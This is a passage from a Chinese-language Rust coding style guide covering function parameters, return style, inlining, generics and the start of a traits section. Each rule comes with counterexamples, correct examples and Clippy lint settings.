<div style="break-before: page; page-break-before: always;"></div><h2 id="pfud02--函数返回值不要使用-return"><a class="header" href="#pfud02--函数返回值不要使用-return">P.FUD.02  函数返回值不要使用 <code>return</code></a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 中函数块会自动返回最后一个表达式的值，不需要显式地指定 <code>return</code>。</p>
<p>只有在函数过程中需要提前返回的时候再加 Return。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo(x: usize) -&gt; usize {
    if x &lt; 42{
        return x;
    }
    return x + 1; // 不符合
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo(x: usize) -&gt; usize {
    if x &lt; 42{
        return x;
    }
    x + 1 // 符合
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud01--函数参数最长不要超过五个"><a class="header" href="#gfud01--函数参数最长不要超过五个">G.FUD.01  函数参数最长不要超过五个</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>为了提升代码可读性，函数的参数最长不宜超过五个。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Color;
// 不符合
fn foo(x: f32, y: f32, name: &amp;str, c: Color, w: u32, h: u32, a: u32, b: u32) {
    // ..
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>想办法把过长的参数缩短。</p>
<pre><pre class="playground"><code class="language-rust">struct Color;
// 符合：此处使用 常量泛型（const generic） 来接收后面多个 u32 类型的参数
// 使用元组 缩短 2~3 个参数为一个参数
fn foo&lt;T, const N: usize&gt;(x: (f32, f32), name: &amp;str, c: Color, last: [T; N]) {
    ;
}

fn main(){
    let arr = [1u32, 2u32];
    foo((1.0f32, 2.0f32), &quot;hello&quot;, Color, arr);
    let arr = [1.0f32, 2.0f32, 3.0f32];
    foo((1.0f32, 2.0f32), &quot;hello&quot;, Color, arr);
}
</code></pre></pre>
<h3 id="lint-检测"><a class="header" href="#lint-检测">【Lint 检测】</a></h3>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#too_many_arguments">too_many_arguments</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 函数参数最长不要超过5个
too-many-arguments-threshold=5
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud02---当函数参数实现了-copy并且是按值传入如果值可能会太大则宜考虑按引用传递"><a class="header" href="#gfud02---当函数参数实现了-copy并且是按值传入如果值可能会太大则宜考虑按引用传递">G.FUD.02   当函数参数实现了 Copy，并且是按值传入，如果值可能会太大，则宜考虑按引用传递</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>通过值传递的参数可能会导致不必要的 <code>memcpy</code> 拷贝，这可能会造成性能损失。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::large_types_passed_by_value)]

<span class="boring">fn main() {
</span>#[derive(Clone, Copy)]
struct TooLarge([u8; 2048]);

// 不符合
fn foo(v: TooLarge) {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::large_types_passed_by_value)]

<span class="boring">fn main() {
</span>#[derive(Clone, Copy)]
struct TooLarge([u8; 2048]);

// 符合
fn foo(v: &amp;TooLarge) {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#large_types_passed_by_value">large_types_passed_by_value</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 如果函数是被导出的 API，则该 lint 不会被触发，是防止 lint 建议对 API 有破坏性的改变。默认为 true
avoid-breaking-exported-api=true 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud03---当函数参数出现太多-bool-类型的参数时应该考虑将其封装为自定义的结构体或枚举"><a class="header" href="#gfud03---当函数参数出现太多-bool-类型的参数时应该考虑将其封装为自定义的结构体或枚举">G.FUD.03   当函数参数出现太多 bool 类型的参数时，应该考虑将其封装为自定义的结构体或枚举</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>布尔类型的参数过多，很难让人记住，容易出错。将其封装为枚举或结构体，可以更好地利用类型系统的检查而避免出错。
其他类型参数过多时，也可以考虑是否可以用自定义结构体或枚举进行封装。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::fn_params_excessive_bools)]

<span class="boring">fn main() {
</span>// 不符合
fn f(is_round: bool, is_hot: bool) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::fn_params_excessive_bools)]

<span class="boring">fn main() {
</span>enum Shape {
    Round,
    Spiky,
}

enum Temperature {
    Hot,
    IceCold,
}

// 符合
fn f(shape: Shape, temperature: Temperature) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#fn_params_excessive_bools">fn_params_excessive_bools</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 用于配置函数可以拥有的 bool 类型参数最大数量，默认为 3。
max-fn-params-bools=3 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud04---当copy-类型的足够小的值作为函数参数时应该按值by-value传入而不是引用by-ref"><a class="header" href="#gfud04---当copy-类型的足够小的值作为函数参数时应该按值by-value传入而不是引用by-ref">G.FUD.04   当Copy 类型的足够小的值作为函数参数时，应该按值（by-value）传入，而不是引用(by-ref)</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在函数参数为 Copy 类型 且 其值足够小的时候，一般情况下，会避免传引用。因为对于这种小的值，性能上和按引用传递是一样快的，并且在代码更容易编写和可读。包括一些小的 结构体，也推荐按值传递，但要注意【例外】示例所示的情况。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::trivially_copy_pass_by_ref)]
<span class="boring">fn main() {
</span>fn foo(v: &amp;u32) {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::trivially_copy_pass_by_ref)]
<span class="boring">fn main() {
</span>fn foo(v: u32) {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>需要注意这种情况下，lint 检查工具会误报。</p>
<pre><pre class="playground"><code class="language-rust">#[derive(Clone, Copy)]
struct RawPoint {
    pub x: u8,
}

#[derive(Clone, Copy)]
struct Point {
    pub raw: RawPoint,
}

impl Point {
    pub fn raw(&amp;self) -&gt; *const RawPoint {
        &amp;self.raw
    }
    // 如果听信 lint 的建议，将上面的 raw 函数参数 self 的引用去掉就是 raw_linted 函数, 这在没有编译优化的情况下（如只是 cargo build 运行在debug模式下）的时候不会出错，但在有编译优化的场景下（如 cargo build --release 运行在release模式）就会出现以下问题。
    pub fn raw_linted(self) -&gt; *const RawPoint {
        &amp;self.raw
    }
}

fn main() {
    let p = Point { raw: RawPoint { x: 10 } };

    // This passes
    assert_eq!(p.raw(), p.raw());
    // This fails 
    // 事实上，如果去掉那个 self 的引用，该函数的行为就变了
    // 因为 结构体 Point 是 Copy 的，每次调用 raw_linted 方法，结构体实例就会被复制一次，得到的结果就不一样了
    assert_eq!(p.raw_linted(), p.raw_linted());
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#trivially_copy_pass_by_ref">trivially_copy_pass_by_ref</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 如果函数是被导出的 API，则该 lint 不会被触发，是防止 lint 建议对 API 有破坏性的改变。默认为 true
avoid-breaking-exported-api=true
# 考虑Copy按值而不是按引用传递的类型的最大大小（以字节为单位）。默认是None
trivial-copy-size-limit=None
</code></pre>
<p><strong>注意</strong>，该 lint 没有考虑指针相关的情况，见例外示例。需要酌情考虑使用。例外示例来自  <a href="https://github.com/rust-lang/rust-clippy/issues/5953">rust-clippy/issues/5953</a> 。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud05---不要总是为函数指定-inlinealways"><a class="header" href="#gfud05---不要总是为函数指定-inlinealways">G.FUD.05   不要总是为函数指定 <code>inline(always)</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>inline</code> 虽然可以提升性能，但也会增加编译时间和编译大小。</p>
<p>Rust 中性能、编译时间和编译大小之间需要权衡。根据需要再 <code>inline</code> 即可。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::inline_always)]

<span class="boring">fn main() {
</span>// 不符合
#[inline(always)]
fn not_quite_hot_code(..) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>根据需要再inline即可，比如明确知道某个函数被调用次数非常频繁，这个时候为了性能考虑要为其手工指定内联。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合：实现内存回收功能，调用非常频繁。性能优先。
#[inline(always)]
pub fn buf_recycle(buf_id: usize) {
    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#inline_always">inline_always</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfud06--函数参数应该考虑兼容多种类型"><a class="header" href="#gfud06--函数参数应该考虑兼容多种类型">G.FUD.06  函数参数应该考虑兼容多种类型</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样的好处是参数可以灵活兼容更多类型，代码方便扩展。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合
fn three_vowels(word: &amp;String) -&gt; bool {
    let mut vowel_count = 0;
    for c in word.chars() {
        match c {
            'a' | 'e' | 'i' | 'o' | 'u' =&gt; {
                vowel_count += 1;
                if vowel_count &gt;= 3 {
                    return true
                }
            }
            _ =&gt; volweld_count = 0
        }
    }
    false
}

fn main() {
    let sentence_string = &quot;Once upon a time, there was a friendly curious crab named Ferris&quot;.to_string();
    for word in sentence_string.split(' ') {
        if three_vowels(word.to_string()) {
            println!(&quot;{} has three consecutive vowels!&quot;, word);
        }
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 符合：这里的参数可以接受 &amp;String / &amp;'str/ &amp;'static str 三种类型参数
fn three_vowels(word: &amp;str) -&gt; bool {
    let mut vowel_count = 0;
    for c in word.chars() {
        match c {
            'a' | 'e' | 'i' | 'o' | 'u' =&gt; {
                vowel_count += 1;
                if vowel_count &gt;= 3 {
                    return true
                }
            }
            _ =&gt; vowel_count = 0
        }
    }
    false
}

fn main() {
    let sentence_string =
        &quot;Once upon a time, there was a friendly curious crab named Ferris&quot;.to_string();
    for word in sentence_string.split(' ') {
        if three_vowels(word) {
            println!(&quot;{} has three consecutive vowels!&quot;, word);
        }
    }
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="310-泛型"><a class="header" href="#310-泛型">3.10 泛型</a></h1>
<p>Rust 中的泛型允许开发人员编写更加简洁、更少重复的代码。但泛型可能会引起编译文件大小膨胀，酌情使用。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pgen01--用泛型来抽象公共语义"><a class="header" href="#pgen01--用泛型来抽象公共语义">P.GEN.01  用泛型来抽象公共语义</a></h2>
<p><strong>【描述】</strong></p>
<p>应该巧用泛型来抽象公共语义，消除重复代码。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::ops::Add;

#[derive(Debug, Clone, Copy)]
struct Meter {
    value: f64
}

impl Meter {
    fn new(value: f64) -&gt; Self {
        Self { value }
    }
}

impl Add for Meter {
    type Output = Meter;

    fn add(self, another: Meter) -&gt; Self::Output {
        let value = self.value + another.value;
        Meter { value }
    }
}

#[derive(Debug, Clone, Copy)]
struct Kilogram {
    value: f64
}

impl Kilogram {
    fn new(value: f64) -&gt; Self {
        Self { value }
    }
}

impl Add for Kilogram {
    type Output = Kilogram;

    fn add(self, another: Kilogram) -&gt; Self::Output {
        let value = self.value + another.value;
        Kilogram { value }
    }
}
fn main() {
    // 不符合：如果要再新增新的单位，还需要实现很多重复代码
    let one_meter = Meter::new(1.0);
    let two_kilograms = Kilogram::new(2.0);
    
    let two_meters = one_meter + one_meter;
}

</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::ops::Add;
use std::marker::PhantomData;

#[derive(Debug, Clone, Copy)]
struct Unit&lt;T&gt; {
    value: f64,
    unit_type: PhantomData&lt;T&gt;,
}

impl&lt;T&gt; Unit&lt;T&gt; {
    fn new(value: f64) -&gt; Self {
        Self {
            value,
            unit_type: PhantomData,
        }
    }
}

impl&lt;T&gt; Add for Unit&lt;T&gt; {
    type Output = Unit&lt;T&gt;;

    fn add(self, another: Unit&lt;T&gt;) -&gt; Self::Output {
        let new_value = self.value + another.value;
        Unit::new(new_value)
    }
}

#[derive(Debug, Clone, Copy)]
struct MeterType;

#[derive(Debug, Clone, Copy)]
struct KilogramType;

type Meter = Unit&lt;MeterType&gt;;
type Kilogram = Unit&lt;KilogramType&gt;;
fn main() {
    // 符合：如果要再新增新的单位，就方便很多了
    let one_meter = Meter::new(1.0);
    let two_kilograms = Kilogram::new(2.0);
    
    let two_meters = one_meter + one_meter;
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pgen02--不要随便使用-impl-trait-语法替代泛型限定"><a class="header" href="#pgen02--不要随便使用-impl-trait-语法替代泛型限定">P.GEN.02  不要随便使用 <code>impl Trait</code> 语法替代泛型限定</a></h2>
<p><strong>【描述】</strong></p>
<p><code>impl Trait</code> 语法 和 泛型限定，虽然都是静态分发，且效果类似，但是它们的语义是不同的。</p>
<p><strong>在类型系统层面上的语义：</strong></p>
<ol>
<li><code>impl Trait</code> 是 存在量化类型。意指，存在某一个被限定的类型。</li>
<li>泛型限定 是 通用量化类型。意指，所有被限定的类型。</li>
</ol>
<p>要根据它们的语义来选择不同的写法。</p>
<p>另外，<code>impl Trait</code> 可以用在函数参数位置和返回值位置，但是不同位置意义不同。</p>
<p><strong>函数参数位置</strong></p>
<p>等价于 泛型参数。</p>
<p>但要注意：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn f(b1: impl Bar, b2: impl Bar) -&gt; usize
<span class="boring">}
</span></code></pre></pre>
<p>等价于：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn f&lt;B1: Bar, B2: Bar&gt;(b1: B1, b2: B2) -&gt; usize
<span class="boring">}
</span></code></pre></pre>
<p>而不是</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn f&lt;B: Bar&gt;(b1: B, b2: B) -&gt; usize
<span class="boring">}
</span></code></pre></pre>
<p>证明示例：</p>
<pre><pre class="playground"><code class="language-rust">use std::fmt::Display;

// 函数参数可以传入 整数，但是函数返回值是 String
fn func(arg: impl Display) -&gt; impl Display {
    format!(&quot;Hay! I am not the same as \&quot;{}\&quot;&quot;, arg)
}

// 很明显不等价于下面这类
// fn somefunc2&lt;T: Display&gt;(arg: T) -&gt; T {
//     // 需要指定同一个类型 T 的行为
// }

fn main(){
    let a  = 42;
    let a = func(42);
}
</code></pre></pre>
<p><strong>函数返回值</strong></p>
<p>在返回值位置上，如果是泛型参数，则是由调用者来选择具体类型，比如 <code>parse::&lt;i32&gt;(&quot;32&quot;)</code> ； 如果是 <code>impl Trait</code>，则是由被调用者来决定具体类型，但只能有一种类型。</p>
<p>在返回值位置上的 <code>impl Trait</code> 会根据函数体的返回值自动推断实现了哪些  auto trait。这意味着你不必在 <code>impl Trait</code> 后面再 加 <code>Sync + Send </code> 这种auto trait。</p>
<p>注意下面代码：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Error： 这里只允许有同一种具体类型，Foo 和 Baz 都实现了 Bar 也是错的。
fn f(a: bool) -&gt; impl Bar {
    if a {
        Foo { ... }
    } else {
        Baz { ... }
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pgen03---不要使用太多泛型参数和-trait-限定否则会增长编译时间"><a class="header" href="#pgen03---不要使用太多泛型参数和-trait-限定否则会增长编译时间">P.GEN.03   不要使用太多泛型参数和 trait 限定，否则会增长编译时间</a></h2>
<p><strong>【描述】</strong></p>
<p>为泛型函数添加详细的 trait 限定，可以在一定程度上增强用户使用体验，但使用过多的泛型参数和 trait 限定会显著地增长编译时间。</p>
<p><strong>【反例】</strong></p>
<p>此写法比正例的写法编译时间要多十倍。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    // From: https://github.com/tokio-rs/axum/pull/198
    fn handle_error&lt;ReqBody, ResBody, F, Res, E&gt;(
        self,
        f: F,
    ) -&gt; HandleError&lt;Self, F, ReqBody, HandleErrorFromRouter&gt;
    where
        Self: Service&lt;Request&lt;ReqBody&gt;, Response = Response&lt;ResBody&gt;&gt;,
        F: FnOnce(Self::Error) -&gt; Result&lt;Res, E&gt;,
        Res: IntoResponse,
        ResBody: http_body::Body&lt;Data = Bytes&gt; + Send + Sync + 'static,
        ResBody::Error: Into&lt;BoxError&gt; + Send + Sync + 'static,
    {
        HandleError::new(self, f)
    }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>来自于 Web 框架 Axum 的代码：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    // From: https://github.com/tokio-rs/axum/pull/198
    fn handle_error&lt;ReqBody, F&gt;(
        self,
        f: F,
    ) -&gt; HandleError&lt;Self, F, ReqBody, HandleErrorFromRouter&gt; {
        HandleError::new(self, f)
    }   
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pgen04--为泛型类型实现方法时impl-中声明的泛型类型参数一定要被用到"><a class="header" href="#pgen04--为泛型类型实现方法时impl-中声明的泛型类型参数一定要被用到">P.GEN.04  为泛型类型实现方法时，<code>impl</code> 中声明的泛型类型参数一定要被用到</a></h2>
<p><strong>【描述】</strong></p>
<p>在 <code>impl</code> 中被声明的类型参数，至少要满足下面三种形式：</p>
<ol>
<li><code>impl&lt;T&gt; Foo&lt;T&gt;</code>，  <code>T</code>  出现在实现的<code>Self</code> 类型<code>Foo&lt;T&gt;</code> 中 。</li>
<li><code>impl&lt;T&gt; SomeTrait&lt;T&gt; for Foo</code> ， <code>T</code>出现在要实现的 trait 中 。</li>
<li><code>impl&lt;T, U&gt; SomeTrait for T where T: AnotherTrait&lt;AssocType=U&gt;</code> ， 出现在 <code>T</code> 的 trait 限定的关联类型中。</li>
</ol>
<p>除此之外，都不算 <code>T</code> 被用到（出现在 Self 类型中）。</p>
<p>有这种限制，主要有两个原因：</p>
<ol>
<li>方便 Rust 类型推断。有这些限制才能明确能推断这些泛型参数的行为，避免产生错误。参考 <a href="https://github.com/rust-lang/rfcs/blob/master/text/0447-no-unused-impl-parameters.md">RFC 0447 </a> 。</li>
<li>避免语义定义不明确的情况。如果 <code>impl</code> 上存在自由的 泛型参数，则无法保证这一点。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// case 1

struct Foo;

impl&lt;T: Default&gt; Foo {
    // error: the type parameter `T` is not constrained by the impl trait, self
    // type, or predicates [E0207]
    fn get(&amp;self) -&gt; T {
        &lt;T as Default&gt;::default()
    }
}

// case 2
trait Maker {
    type Item;
    fn make(&amp;mut self) -&gt; Self::Item;
}
struct Foo&lt;T&gt; {
    foo: T
}
struct FooMaker;
impl&lt;T: Default&gt; Maker for FooMaker {
// error: the type parameter `T` is not constrained by the impl trait, self
// type, or predicates [E0207]
    type Item = Foo&lt;T&gt;;

    fn make(&amp;mut self) -&gt; Foo&lt;T&gt; {
        Foo { foo: &lt;T as Default&gt;::default() }
    }
}

// error: the type parameter `A` is not constrained by the impl trait, self type, or predicates
trait Foo {}
impl&lt;F, A&gt; Foo for F where F: Fn(A) {} // error
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// case 1
struct Foo;

// Move the type parameter from the impl to the method
impl Foo {
    fn get&lt;T: Default&gt;(&amp;self) -&gt; T {
        &lt;T as Default&gt;::default()
    }
}

// case 2
use std::marker::PhantomData;

trait Maker {
    type Item;
    fn make(&amp;mut self) -&gt; Self::Item;
}

struct Foo&lt;T&gt; {
    foo: T
}

// Add a type parameter to `FooMaker`
struct FooMaker&lt;T&gt; {
    phantom: PhantomData&lt;T&gt;,
}

impl&lt;T: Default&gt; Maker for FooMaker&lt;T&gt; {
    type Item = Foo&lt;T&gt;;

    fn make(&amp;mut self) -&gt; Foo&lt;T&gt; {
        Foo {
            foo: &lt;T as Default&gt;::default(),
        }
    }
}

// closue : 相关 issue:  https://github.com/rust-lang/rust/issues/25041 
trait Foo {}
impl&lt;F, A&gt; Foo for F where F: Fn() -&gt; A {} // 此处 A 是 闭包trait内的一个关联类型
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pgen05-定义泛型函数时如果该函数实现用到来自-trait-定义的相关行为需要为泛型指定相关-trait-的限定"><a class="header" href="#pgen05-定义泛型函数时如果该函数实现用到来自-trait-定义的相关行为需要为泛型指定相关-trait-的限定">P.GEN.05 定义泛型函数时，如果该函数实现用到来自 trait 定义的相关行为，需要为泛型指定相关 trait 的限定</a></h2>
<p><strong>【描述】</strong></p>
<p>泛型，在 Rust 类型系统中的语义是一种 通用量化类型（Universally-quantified type），即，泛型类型<code> T</code> 的所有可能 的单态类型。</p>
<p>在泛型函数内部，如果使用了来自某个 trait 定义的行为，则需要为泛型指定相关的 trait 限定，来排除其他没有实现该trait 的类型。</p>
<blockquote>
<p>注：Rust编译器可以检测这种情况，但是编译错误比较晦涩，本原则用来提示开发者注意这种情况。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::fmt;

// println! 中 `{:?}` 为 Debug triat 定义行为
fn some_func&lt;T&gt;(foo: T) {
    println!(&quot;{:?}&quot;, foo); // error[E0277]: `T` doesn't implement `Debug`
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::fmt;

// 为泛型类型 T 指派 Debug triat 限定
fn some_func&lt;T: fmt::Debug&gt;(foo: T) {
    println!(&quot;{:?}&quot;, foo); 
}

struct A;

fn main() {
   some_func(5i32);
   
   // A 没有实现 Debug trait，会被排除掉
   some_func(A); // error[E0277]: `A` doesn't implement `Debug`
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ggen01-不要在泛型位置上使用内建类型"><a class="header" href="#ggen01-不要在泛型位置上使用内建类型">G.GEN.01 不要在泛型位置上使用内建类型</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样做虽然会导致编译错误，但是这种错误会使开发者感到困惑，反而无法找到问题所在。</p>
<p><strong>【反例】</strong></p>
<p>这里 <code>u32</code> 会被认为是一个类型参数。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
impl&lt;u32&gt; Foo&lt;u32&gt; {
    fn impl_func(&amp;self) -&gt; u32 {
        42
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
impl&lt;T&gt; Foo&lt;T&gt; {
    fn impl_func(&amp;self) -&gt; T {
        42
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#builtin_type_shadow">builtin_type_shadow</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ggen02---使用-rust-标准库中某些方法要注意避免使用其泛型默认实现而应该使用具体类型的实现"><a class="header" href="#ggen02---使用-rust-标准库中某些方法要注意避免使用其泛型默认实现而应该使用具体类型的实现">G.GEN.02   使用 Rust 标准库中某些方法，要注意避免使用其泛型默认实现，而应该使用具体类型的实现</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 标准库内部某些类型使用了 泛型特化（未稳定特性），比如 <code>ToString</code> trait。</p>
<p>该 trait 有一个<a href="https://doc.rust-lang.org/stable/src/alloc/string.rs.html#2369">泛型默认实现</a>， 并且一些具体类型也实现了它，比如 <code>char</code>/ <code>str</code> /  <code>u8</code>/ <code>i8</code> 等。</p>
<p>在实际代码中，应该选择去调用具体类型实现的 <code>to_string()</code> 方法，而非调用泛型的默认实现。 </p>
<p><strong>这一规则要求开发者对 Rust 标准库的一些方法实现有一定了解。</strong> </p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::inefficient_to_string)]

<span class="boring">fn main() {
</span>// 不符合
// 闭包参数中， s 为 `&amp;&amp;str` 类型
//  `&amp;&amp;str` 就会去调用泛型的默认实现
[&quot;foo&quot;, &quot;bar&quot;].iter().map(|s| s.to_string() );
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::inefficient_to_string)]

<span class="boring">fn main() {
</span>// 符合
// 闭包参数中， s 为 `&amp;&amp;str` 类型，使用 `|&amp;s|` 对参数模式匹配后，闭包体内 `s` 就变成了 `&amp;str` 类型
// 经过这样的转换，直接调用 `&amp;str`的 `to_string()` 方法，而如果是 `&amp;&amp;str` 就会去调用泛型的默认实现。 
[&quot;foo&quot;, &quot;bar&quot;].iter().map(|&amp;s| s.to_string() );
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#inefficient_to_string">inefficient_to_string</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="311-特质"><a class="header" href="#311-特质">3.11 特质</a></h1>
<p>特质就是指 trait。在 Rust 中， trait 不是具体类型，而是一种抽象接口。但是通过 <code>impl Trait</code> 和 <code>dyn Trait</code> 也可以将 trait 作为类型使用。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptra01--使用-trait-时要注意-trait-一致性规则"><a class="header" href="#ptra01--使用-trait-时要注意-trait-一致性规则">P.TRA.01  使用 trait 时要注意 trait 一致性规则</a></h2>
<p><strong>【描述】</strong></p>
